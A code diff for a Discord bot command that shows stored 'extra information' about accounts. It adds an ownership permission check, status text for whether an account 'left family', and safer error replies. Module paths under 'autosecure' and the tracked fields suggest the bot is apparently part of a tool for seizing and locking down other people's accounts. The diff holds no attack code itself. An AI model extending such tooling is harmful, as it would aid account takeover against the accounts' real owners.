@@ -3,12 +3,29 @@ const { queryParams } = require("../../../db/database");
 const config = require("../../../config.json");
 const { codeblock } = require("../../../autosecure/utils/process/helpers");
 
+const isOwner = require("../../../db/isOwner");
+
 module.exports = {
     name: "extrainformation",
     ownerOnly: true,
     callback: async (client, interaction) => {
         try {
-            let [t, uid] = interaction.customId.split("|");
+            const parts = interaction.customId.split("|");
+            let uid;
+
+            if (parts.length === 3) {
+                const [, userId, targetUid] = parts;
+                const isUserOwner = await isOwner(interaction.user.id);
+                if (userId && interaction.user.id !== userId && !isUserOwner) {
+                    return interaction.reply({
+                        content: "You do not have permission to view extra information for this account.",
+                        ephemeral: true,
+                    });
+                }
+                uid = targetUid;
+            } else {
+                uid = parts[1];
+            }
 
             const results = await queryParams("SELECT * FROM extrainformation WHERE uid = ?", [uid]);
 
@@ -139,15 +156,22 @@ module.exports = {
 
             const deviceDisplay = deviceCount === 0 ? "```😊```" : `\`\`\`${deviceCount}\`\`\``;
 
-            const ds = info.leftfamily ?? "Couldn't find";
+            const hasFamily = info.family &&
+                !info.family.includes("No members found") &&
+                !info.family.includes("Error while finding members") &&
+                info.family.trim().length > 0;
+
+            const ds = info.leftfamily;
             let dss;
 
-            if (ds === 'None') {
-                dss = 'None';
-            } else if (ds === 'False' || ds === false) {
-                dss = "Couldn't leave!";
-            } else if (ds === 'True' || ds === true) {
+            if (ds === 'True' || ds === true) {
                 dss = "Left";
+            } else if (ds === 'False' || ds === false || ds === 'Failed to leave family!') {
+                dss = "Couldn't leave!";
+            } else if (hasFamily) {
+                dss = "In Family";
+            } else if (ds === 'None' || !hasFamily) {
+                dss = "None";
             } else {
                 dss = "Couldn't find";
             }
@@ -204,10 +228,17 @@ module.exports = {
             await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
         } catch (error) {
             console.error("Error processing extra information:", error);
-            return interaction.reply({
-                content: "An error occurred while retrieving the information.",
-                ephemeral: true,
-            });
+            if (interaction.replied || interaction.deferred) {
+                return interaction.followUp({
+                    content: "An error occurred while retrieving the information.",
+                    ephemeral: true,
+                }).catch(() => {});
+            } else {
+                return interaction.reply({
+                    content: "An error occurred while retrieving the information.",
+                    ephemeral: true,
+                }).catch(() => {});
+            }
         }
     }
 };
